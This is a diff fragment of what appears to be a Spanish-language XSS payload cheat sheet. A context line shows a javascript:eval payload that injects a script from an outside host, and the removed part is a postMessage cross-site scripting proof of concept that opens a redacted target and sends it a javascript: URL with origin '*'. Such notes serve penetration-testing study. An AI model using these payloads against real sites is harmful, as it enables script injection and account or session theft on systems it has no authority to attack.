@@ -162,27 +162,3 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'https://yoursu
 ```
 
 Mas opciones https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc 
-XSS in PostMessage
-
-    If the target origin is asterisk * the message can be sent to any domain has reference to the child page.
-
-<html>
-<body>
-    <input type=button value="Click Me" id="btn">
-</body>
-
-<script>
-document.getElementById('btn').onclick = function(e){
-    window.poc = window.open('http://www.redacted.com/#login');
-    setTimeout(function(){
-        window.poc.postMessage(
-            {
-                "sender": "accounts",
-                "url": "javascript:confirm('XSS')",
-            },
-            '*'
-        );
-    }, 2000);
-}
-</script>
-</html>
